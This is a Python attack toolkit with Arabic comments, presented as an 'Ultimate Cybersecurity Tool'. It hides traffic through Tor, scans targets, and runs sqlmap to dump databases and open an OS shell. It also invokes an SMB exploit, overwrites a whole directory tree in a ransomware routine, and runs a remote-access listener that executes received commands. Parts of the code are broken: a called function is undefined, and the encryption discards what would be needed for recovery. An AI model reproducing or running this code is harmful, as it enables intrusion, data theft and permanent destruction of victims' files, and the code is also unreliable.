import os
import socket
import subprocess
import requests
import logging
import random
import string
import base64
import hashlib
import re
import threading
import json
import platform
import urllib.request
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import socks
import ssl
from nmap import PortScanner
from impacket import smb
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import pyautogui
import pyaudio
import wave
import shutil
import cv2
from onvif import ONVIFCamera

# ========================
# إعدادات السجل
# ========================
LOG_FILE = 'ultimate_cyber_tool_log.txt'
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# ========================
# وظائف المساعدة العامة
# ========================
def request_permission(tool_name, description):
    """
    طلب إذن المستخدم لتشغيل أداة معينة.
    """
    print(f"[INFO] {tool_name}: {description}")
    choice = input(f"[?] Do you want to proceed with {tool_name}? (y/n): ").strip().lower()
    return choice == 'y'

def is_ip_address(target):
    """
    التحقق إذا كان الهدف عنوان IP.
    """
    ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return bool(re.match(ip_pattern, target))

def save_to_logfile(content, filename="tool_output.log"):
    """
    حفظ نتائج الأداة إلى ملف.
    """
    try:
        with open(filename, "a") as file:
            file.write(content + "\n")
        logging.info(f"Output saved to {filename}")
    except Exception as e:
        logging.error(f"Failed to save output to {filename}: {e}")

# ========================
# وظائف التشفير المتقدمة
# ========================
def generate_aes_key():
    """
    توليد مفتاح تشفير AES قوي.
    """
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    salt = os.urandom(32)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA512(),
        length=32,
        salt=salt,
        iterations=500000
    )
    return kdf.derive(password.encode()), salt

def encrypt_file(filepath, key):
    """
    تشفير ملف باستخدام AES بمستوى عالي من الأمان.
    """
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        cipher = Cipher(algorithms.AES(key), modes.GCM(os.urandom(12)))
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(data) + encryptor.finalize()
        with open(filepath, 'wb') as f:
            f.write(encrypted_data)
        logging.info(f"File encrypted: {filepath}")
    except Exception as e:
        logging.error(f"Error encrypting file {filepath}: {e}")

# ========================
# وظائف التخفي
# ========================
def configure_stealth_mode():
    """
    إعداد بيئة التخفي باستخدام Tor و VPN.
    """
    try:
        logging.info("Configuring stealth mode...")
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        subprocess.run(["openvpn", "--config", "vpn_config.ovpn"], shell=True)
        logging.info("Stealth mode configured.")
    except Exception as e:
        logging.error(f"Stealth mode configuration failed: {e}")

# ========================
# وظائف الكشف
# ========================
def run_testssl(target):
    """
    تشغيل TestSSL للكشف عن ثغرات SSL.
    """
    if not request_permission("TestSSL", "Check SSL vulnerabilities?"):
        return
    try:
        command = [
            "./testssl.sh", "--vulnerable", "--severity", "HIGH", "--full", "--sneaky",
            "--show-each", "--wide", "--color", "3", "--json-pretty", "--html",
            "--logfile", "deep_scan_result.log", "--assume-http", "--ids-friendly",
            "--debug", "6", "--openssl", "/usr/bin/openssl", "--connect-timeout", "5",
            "--openssl-timeout", "5", target
        ]
        subprocess.run(command)
    except Exception as e:
        logging.error(f"TestSSL failed: {e}")

def run_nmap(target):
    """
    تشغيل Nmap لفحص الهدف.
    """
    if not request_permission("Nmap", "Run Nmap to scan the target?"):
        return
    try:
        if is_ip_address(target):
            subprocess.run(["nmap", "-A", "-T4", target])
            subprocess.run(["nmap", "-p-", target])
            subprocess.run(["nmap", "--script", "vuln", target])
        else:
            logging.warning("[Nmap] Target must be an IP address.")
    except Exception as e:
        logging.error(f"Nmap failed: {e}")

# ========================
# وظائف الهجمات
# ========================
def run_sqlmap(target):
    """
    تشغيل SQLMap لاستغلال ثغرات SQL Injection.
    """
    try:
        subprocess.run([ 
            "sqlmap", "-u", f"{target}?id=1 OR 1=1", "--batch", "--level=5", "--risk=3", 
            "--tamper=space2comment,charencode,randomcase,between", "--random-agent", 
            "--crawl=10", "--threads=10", "--technique=BEUSTQ", "--time-sec=10", 
            "--output-dir=sqlmap_output", "--dbs", "--dump-all", "--forms", "--smart", "--os-shell"
        ])
    except Exception as e:
        logging.error(f"SQLMap failed: {e}")

def exploit_smb(target_ip):
    """
    استغلال SMB (مثل EternalBlue).
    """
    if not request_permission("SMB Exploit", f"Attempt SMB exploitation on {target_ip}?"):
        return
    try:
        logging.info(f"Exploiting SMB on {target_ip}...")
        smb_exploit_script = "path/to/smb_exploit.py"
        subprocess.run(["python3", smb_exploit_script, target_ip])
    except Exception as e:
        logging.error(f"SMB exploit failed: {e}")

def deploy_ransomware(target_directory):
    """
    تنفيذ برمجية فدية (محاكاة).
    """
    if not request_permission("Ransomware", "Deploy ransomware on the target?"):
        return
    try:
        logging.info("Deploying ransomware...")
        key, salt = generate_aes_key()
        for root, _, files in os.walk(target_directory):
            for file in files:
                filepath = os.path.join(root, file)
                with open(filepath, "rb") as f:
                    encrypted_data = encrypt_data(f.read().decode(errors="ignore"), key)
                with open(filepath, "wb") as f:
                    f.write(encrypted_data)
        logging.info("Ransomware deployed successfully.")
    except Exception as e:
        logging.error(f"Ransomware deployment failed: {e}")

def setup_rat_listener(port):
    """
    إعداد مستمع RAT.
    """
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("0.0.0.0", port))
        server.listen(5)
        logging.info(f"RAT listener started on port {port}.")
        while True:
            client, addr = server.accept()
            logging.info(f"Connection from {addr}")
            threading.Thread(target=handle_rat_client, args=(client,)).start()
    except Exception as e:
        logging.error(f"RAT listener setup failed: {e}")

def handle_rat_client(client_socket):
    """
    التعامل مع العميل RAT.
    """
    try:
        while True:
            command = client_socket.recv(1024).decode()
            if command.lower() == "exit":
                client_socket.close()
                break
            output = subprocess.getoutput(command)
            client_socket.send(output.encode())
    except Exception as e:
        logging.error(f"Error handling RAT client: {e}")

# ========================
# الوظيفة الرئيسية
# ========================
def main():
    print("[INFO] Ultimate Cybersecurity Tool Starting...")
    configure_stealth_mode()

    target = input("Enter target (IP or URL): ").strip()
    print("Select an action:")
    actions = {
        "1": ("Run TestSSL", run_testssl),
        "2": ("Run Nmap Scan", run_nmap),
        "3": ("Run SQLMap", run_sqlmap),
        "4": ("Exploit SMB", exploit_smb),
        "5": ("Deploy Ransomware", deploy_ransomware),
        "6": ("Start RAT Listener", setup_rat_listener),
    }
    for key, (desc, _) in actions.items():
        print(f"{key}) {desc}")

    choice = input("Choose an action: ").strip()
    if choice in actions:
        actions[choice][1](target)
    else:
        print("[ERROR] Invalid choice.")

if __name__ == "__main__":
    main()
